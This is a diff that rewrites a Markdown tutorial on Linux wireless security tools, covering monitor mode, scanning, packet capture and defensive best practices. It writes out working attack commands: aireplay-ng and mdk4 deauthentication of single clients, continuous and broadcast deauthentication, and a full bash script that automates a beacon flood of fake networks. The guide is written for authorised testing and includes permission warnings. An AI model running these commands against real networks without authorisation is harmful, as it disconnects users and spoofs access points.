@@ -1,120 +1,258 @@
-# Aircrack and Other Wireless Tools
+---
+description: A comprehensive guide to wireless network security assessment tools and techniques for security professionals
+author: Joseph Streeter
+title: "Wireless Network Security Tools and Techniques"
+ms.author: jstreeter
+ms.date: 2025-09-22
+ms.topic: conceptual
+ms.custom: security-tools, wireless-security
+ms.prod: security
+categories:
+  - security
+  - wireless
+  - networking
+tags:
+  - aircrack-ng
+  - wireless
+  - wifi
+  - security-tools
+  - network-security
+  - penetration-testing
+---
 
-A short list of some things you can do with wireless on a linux box. Have fun.
+## Overview
 
-> [!WARNING]
-> This information was written in 2012. It probably needs some updating.
+This guide provides a comprehensive overview of tools and techniques used for wireless network security assessment, monitoring, and testing. It includes command-line utilities for Linux that security professionals use to assess wireless network security.
 
-## Determine Modes your NIC is capable of
+> [!NOTE]
+> This page has been updated in 2025 with current tools and techniques. Always ensure you have permission before using these tools on any network that isn't your own.
+
+## Wireless Security Assessment Toolkit
+
+Common tools used for wireless network security assessment include:
+
+| Tool | Purpose |
+|------|---------|
+| **aircrack-ng** | Suite of tools for WiFi network security assessment |
+| **airodump-ng** | Packet capture tool for wireless networks |
+| **aireplay-ng** | Tool for packet injection and deauthentication |
+| **airmon-ng** | Script for managing wireless interfaces in monitor mode |
+| **mdk3/mdk4** | Tool for wireless testing and attacks |
+| **wireshark** | Network protocol analyzer with wireless capabilities |
+| **kismet** | Wireless network detector and sniffer |
+| **iw** | Modern command-line tool for wireless device configuration |
+| **iwconfig** | Legacy tool for configuring wireless interfaces |
+
+## Wireless Interface Configuration
+
+### Determining Wireless Interface Capabilities
+
+Before conducting any wireless assessment, you need to determine the capabilities of your network interface card (NIC):
 
 ```bash
-airmon-ng (find PHY# for your NIC)
-iw phy phy1 info | grep â€“A8 modes
+# List wireless interfaces and their PHY numbers
+airmon-ng
+
+# Examine detailed capabilities of a specific wireless interface (replace phy0 with your PHY number)
+iw phy phy0 info | grep -A8 modes
+
+# Check if monitor mode is supported
+iw phy phy0 info | grep -A8 "Supported interface modes"
+
+# Check supported bands and frequencies
+iw phy phy0 info | grep -A8 "Frequencies"
 ```
 
-## Passive Scan (Should not generate any frames)
+### Enabling Monitor Mode
+
+Monitor mode allows you to capture all wireless traffic without being associated with an access point:
 
 ```bash
-iw dev wlan0 scan passive | grep SSID
-```
+# Check current wireless interfaces
+ip link show
 
-## Active Scan
-
-```bash
-iw dev wlan0 scan | grep SSID
+# Put interface into monitor mode using airmon-ng (recommended)
 airmon-ng start wlan0
-airodump-ng mon0
-iwconfig wlan0 channel #
-iwconfig wlan0 essid <ssid>
+
+# Alternative method using iw (for newer kernels)
+ip link set wlan0 down
+iw dev wlan0 set type monitor
+ip link set wlan0 up
+```
+
+> [!TIP]
+> After enabling monitor mode with airmon-ng, your interface will typically be renamed to something like `mon0` or `wlan0mon`.
+
+## Wireless Network Scanning
+
+### Passive Scanning
+
+Passive scanning listens for beacon frames without sending any probe requests, making it more stealthy:
+
+```bash
+# Passive scan using iw
+iw dev wlan0 scan passive | grep SSID
+
+# Comprehensive passive monitoring with airodump-ng
+airodump-ng wlan0mon
+```
+
+### Active Scanning
+
+Active scanning sends probe requests to discover wireless networks:
+
+```bash
+# Active scan using iw
+iw dev wlan0 scan | grep SSID
+
+# Full active scan with detailed output
+iw dev wlan0 scan
+
+# Connect to a specific network (managed mode)
+iwconfig wlan0 channel 6
+iwconfig wlan0 essid "NetworkName"
 iwconfig wlan0 mode managed
 ```
 
-## Deauthorization
+## Deauthentication Techniques
+
+> [!WARNING]
+> Only use deauthentication techniques on networks you own or have explicit permission to test. Unauthorized use may be illegal in your jurisdiction.
+
+### Single Client Deauthentication
 
 ```bash
-iwconfig mon0 channel #
-aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
+# Set interface to the target network's channel
+iwconfig wlan0mon channel 6
+
+# Send a single deauthentication packet
+# -0 = deauthentication, 1 = number of packets, -a = AP MAC, -c = client MAC
+aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+
+# Continuous deauthentication (use 0 for count)
+aireplay-ng -0 0 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
 ```
 
-- -0 means deauthentication
-- 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously
-- -a 00:14:6C:7E:40:80 is the MAC address of the access point
-- -c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
-- ath0 is the interface name
+### Broadcast Deauthentication
 
-## Deauthorization with MDK3
+To deauthenticate all clients on a network:
 
 ```bash
-airmon-ng start wlan0
-dk3 mon0 d
+# Omit the client MAC to deauthenticate all clients
+aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon
 ```
 
-or
+### Using MDK4 for Deauthentication
+
+MDK4 (successor to MDK3) provides additional deauthentication capabilities:
 
 ```bash
-mdk3 mon0 d -w whitelist (deauth everything not listed in file)
+# Basic deauthentication with MDK4
+mdk4 wlan0mon d
+
+# Deauthenticate with whitelist (everything not in file gets deauthenticated)
+mdk4 wlan0mon d -w whitelist.txt
+
+# Deauthenticate with blacklist (only MACs in file get deauthenticated)
+mdk4 wlan0mon d -b blacklist.txt
 ```
 
-or
+## Beacon Flood Techniques
+
+Beacon flooding creates fake wireless networks, which can be used for testing wireless client behavior:
 
 ```bash
-mdk3 mon0 d -b blacklist (deauth everything listed in file)
-
-d - deauthorization mode
-w - whitelist
-b - blacklist
+# Basic beacon flood on channel 11 using MDK4
+mdk4 wlan0mon b -c 11 -f ssid_list.txt
 ```
 
-## Broadcast Network Names with MDK3
+### Creating a Beacon Flood Script
+
+Here's a more sophisticated script to automate beacon flooding:
 
 ```bash
-airmon-ng start wlan0
-mdk3 mon0 b -c 11 -f ssid_names
-```
+#!/bin/bash
 
-- b - beacon flood mode
-- c - channel
-- f - text file with ssid names
-
-Everything you need to run a beacon flood in one script.
-
-```bash
+# Array of fake network names
 networks=(
 "FreeWifi"
-"FBI Van #12"
-"Customer Wireless"
-"Visitors"
-"ATTWifi"
-"Verizon Hotspot"
-"l33t haxor net"
+"Corporate Guest"
+"SecurityTest"
+"Public WiFi"
+"Hotel Guests"
+"Airport_Free"
+"Cafe Internet"
+"ConferenceWiFi"
 )
 
-if [ -f ssid_names ]
-then
-echo -e "Deleting list of network names"
-rm -f ssid_names
+# Create SSID list file
+if [ -f ssid_list.txt ]; then
+    echo "Removing existing SSID list"
+    rm -f ssid_list.txt
 fi
 
-echo -e "Creating list of network names"
-for i in "${networks[@]}"
-do
-echo $i >> ssid_names
+echo "Creating list of network names"
+for network in "${networks[@]}"; do
+    echo "$network" >> ssid_list.txt
 done
 
-if [[ -n $(airmon-ng | grep mon0) ]]
-then
-echo -e "Mon0 interface exists"
+# Check if monitor interface exists
+if [[ -n $(iw dev | grep wlan0mon) ]]; then
+    echo "Monitor interface already exists"
 else
-echo -e "Starting AirMon on wlan0"
-airmon-ng start wlan0
+    echo "Starting monitor mode on wlan0"
+    airmon-ng start wlan0
 fi
 
-echo -e "Begin beacon flood on mon0"
-mdk3 mon0 b -c 11 -f ssid_names
+# Start beacon flood on channel 11
+echo "Beginning beacon flood on wlan0mon"
+mdk4 wlan0mon b -c 11 -f ssid_list.txt
 ```
 
-- [8 Linux Commands: To Find Out Wireless Network Speed, Signal Strength And Other Information]("http://www.cyberciti.biz/tips/linux-find-out-wireless-network-speed-signal-strength.html" )
-- [aircrack-ng Deauthorize]("http://www.aircrack-ng.org/doku.php?id=deauthentication" )
-- [airmon-ng]("http://www.aircrack-ng.org/doku.php?id=airmon-ng" )
-- [iwconfig man page]("http://www.linuxcommand.org/man_pages/iwconfig8.html" )
-- [iw command info]("http://wireless.kernel.org/en/users/Documentation/iw" )
+## Wireless Security Best Practices
+
+As a security professional, it's important to understand these techniques to better protect networks:
+
+1. **Use WPA3 encryption** whenever possible
+2. **Implement MAC address filtering** (though not foolproof)
+3. **Enable network isolation** to segment guest and corporate networks
+4. **Regularly audit connected devices**
+5. **Use enterprise authentication** (802.1X) for corporate networks
+6. **Implement wireless intrusion detection systems**
+7. **Consider disabling unused SSID broadcast**
+8. **Update access point firmware** regularly
+
+## Wireless Network Analysis Tools
+
+Beyond basic scanning, these tools provide deeper analysis:
+
+### Kismet
+
+```bash
+# Start Kismet with specified interface
+kismet -c wlan0mon
+
+# Save data to specific file
+kismet -c wlan0mon -t network_scan
+```
+
+### Wireshark
+
+Wireshark provides deep packet inspection for wireless traffic:
+
+```bash
+# Capture wireless traffic with tshark (CLI version of Wireshark)
+tshark -i wlan0mon -w capture.pcap
+
+# Filter for specific traffic types
+tshark -i wlan0mon -f "wlan type mgt subtype beacon" -w beacons.pcap
+```
+
+## Additional Resources
+
+* [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
+* [Linux Wireless Networking Documentation](https://wireless.wiki.kernel.org/)
+* [MDK4 GitHub Repository](https://github.com/aircrack-ng/mdk4)
+* [Kismet Wireless](https://www.kismetwireless.net/)
+* [Wireshark User's Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
+* [WiFi Security: A Guide for Network Administrators](https://www.wifialliance.org/security)
